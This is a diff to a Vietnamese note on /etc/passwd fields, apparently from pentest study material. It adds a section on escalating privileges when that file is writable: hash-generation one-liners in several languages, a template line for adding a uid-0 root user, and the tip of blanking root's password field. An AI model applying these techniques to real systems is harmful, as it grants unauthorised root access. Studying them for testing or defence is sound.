@@ -30,4 +30,34 @@ Số điện thoại văn phòng
 Shell: Nó biểu thị đường dẫn đầy đủ của shell mặc định thực thi lệnh (bởi người dùng) và hiển thị kết quả.
 
 LƯU Ý: Mỗi trường được phân tách bằng (dấu hai chấm)
+
+# Các Kiểu edit
+
+### Diều kiện tiên quyết: có quyền write file /etc/passwd
+
+### Các cách edit
+- openssl: `openssl passwd 123` ---> xxxxx
   
+      user:xxxxx:0:0:root:/root:/bin/bash
+- mkpasswd -m <method> <password>
+
+      mkpasswd -m SHA-512 pass123
+- python
+  
+      python3 -c 'import crypt; print (crypt.crypt("pass123", "$6$salt"))'
+- perl
+
+      perl -le 'print crypt("pass123", "abc")'
+- php
+
+      php -r "print(crypt('aarti','123') . \"\n\");"
+- ruby
+
+      ruby -r 'digest' -e 'puts "pass".crypt("$6$salt")'
+- Đặc biệt có thể xóa kí tự x hoặc * của root trong file /etc/passwd
+
+![image](https://github.com/user-attachments/assets/09a81c5d-1546-4874-9576-e60c552f5b7b)
+
+![image](https://github.com/user-attachments/assets/49abd8a3-ad06-4824-ae72-f3041502d4f0)
+
+
